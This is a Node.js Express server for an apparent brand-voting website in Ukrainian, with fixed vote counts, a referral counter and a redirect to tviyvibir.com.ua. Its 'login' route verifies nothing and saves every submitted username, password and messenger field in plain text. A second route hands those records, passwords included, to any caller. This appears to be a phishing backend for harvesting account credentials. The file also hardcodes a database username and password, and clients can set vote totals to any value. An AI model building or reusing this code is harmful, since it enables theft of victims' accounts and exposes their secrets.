const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const userSchema = require('./schemas/userSchema');
const candidateSchema = require('./schemas/candidateSchema');
const path = require('path')
const app = express();
const port = 80;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Mongoose User model
const User = mongoose.model('User', userSchema);
const Candidate = mongoose.model('Candidate', candidateSchema);

const tabs = {
    tab1: {
        front: {
            id: 'atb',
            name: 'АТБ',
            color: 'red',
            voices: 2437
        },
        back: {
            id: 'silpo',
            name: 'Сільпо',
            color: 'orange',
            voices: 1849
        }
    },
    tab2: {
        front: {
            id: 'foxtrot',
            name: 'Фокстрот',
            color: 'orange',
            voices: 1762
        },
        back: {
            id: 'allo',
            name: 'Aлло',
            color: 'red',
            voices: 1452
        }
    },
    tab3: {
        front: {
            id: 'socar',
            name: 'Socar',
            color: '#7CB9E8',
            voices: 876
        },
        back: {
            id: 'wog',
            name: 'Wog',
            color: 'green',
            voices: 1370
        }
    },
}

// Route for user creation
app.post('/api/auth/login', async (req, res) => {
    const { username, password, messanger } = req.body;
    try {
        // Validate input (example: check if username and password are provided)
        if (!username || !password) {
            return res.status(400).send('Username and password are required');
        }

        // Create a new user document
        const newUser = await User.create({ username, password, messanger });

        // Send success response
        res.status(200).json(newUser);
    } catch (error) {
        // Handle error
        console.error("Error creating user:", error);
        res.status(500).send("Error creating user");
    }
});

app.get('/api/refLink', async (req, res) => {
    const { username } = req.query;

    try {
        // Create a new user document
        const user = await User.updateOne(
            { username },
            {$inc : {'refferals' : 1}}, 
        );
        // Send success response
        res.redirect('http://tviyvibir.com.ua?status=ok')
    } catch (error) {
        // Handle error
        console.error("Error creating user:", error);
        res.status(500).send("Error creating user");
    }
});

app.get('/api/tabs', async (req, res) => {
    res.status(200).json(tabs);
});

app.get('/api/tabs/:selectedTab/:elementTab', async (req, res) => {
    const selectedTab = req.params.selectedTab
    const elementTab = req.params.elementTab
    const el = await Candidate.findOne({tabId: selectedTab, elementId: elementTab})

    if (el) {
        res.status(200).json(el);
    } else {
        const tab = tabs[selectedTab]

        if (tab.front.id === elementTab) {
            res.status(200).json(tabs[selectedTab].front)
        } else {
            res.status(200).json(tabs[selectedTab].back)
        }
    }
});


app.get('/api/user', async (req, res) => {
    const { username } = req.query;

    try {
        // Create a new user document
        const user = await User.find({ username });
        res.status(200).json(user);
    } catch (error) {
        // Handle error
        console.error("Error creating user:", error);
        res.status(500).send("Error creating user");
    }
});

app.get('/api/vote', async (req, res) => {
    try {
        const elements = await Candidate.find({})
        res.status(200).json(elements);
    } catch (error) {
        // Handle error
        console.error("Error creating user:", error);
        res.status(500).send("Error creating user");
    }
});

app.post('/api/vote', async (req, res) => {
    let { selectedTab, selectedCardSide, username, voices } = req.body;
    console.log('data', req.body);

    try {
        const tab = tabs[selectedTab]
        if (tab) {
            const selectedItem = tab[selectedCardSide];
            const candidate = await Candidate.findOne({
                tabId: selectedTab,
                elementId: selectedItem.id,
            })
            
            if (candidate) {
                const el = await Candidate.findOneAndUpdate(
                    {
                        tabId: selectedTab,
                        elementId: selectedItem.id
                    },
                    {$set: {
                        'voices': voices
                    }},
                    {new: true}
                )

                console.log(el);
            } else {
                await Candidate.create({
                    tabId: selectedTab,
                    elementId: selectedItem.id,
                    voices: voices
                })
            }

            if (!selectedItem.id || !selectedItem.name) {
                throw new Error('selectedItem must have id and name fields');
            }

            await User.findOneAndUpdate(
                {username: username},
                {
                    $set : {
                        'voitedFor': {
                            id: selectedItem.id,
                            name: selectedItem.name
                        }
                    }
                }
            );
        
            res.sendStatus(200);
        } else {
            res.sendStatus(400);
        }
    } catch (error) {
        // Handle error
        console.error("Error creating user:", error);
        res.status(500).send("Error creating user");
    }
});

// Start server
app.listen(port, async () => {
    console.log(`Example app listening on port ${port}`);

    try {
        await mongoose.connect('mongodb+srv://petr:petr900100@db.3bimhc9.mongodb.net/?retryWrites=true&w=majority&appName=DB',
            { useNewUrlParser: true, useUnifiedTopology: true });
        console.log("Connected to MongoDB");
    } catch (err) {
        console.error("MongoDB connection error:", err);
    }
});

app.use(express.static(path.resolve(__dirname, '../', 'client')))
app.get('*', (_, res) => {
    res.sendFile(path.resolve(__dirname, '../', 'client', 'index.html'))
})
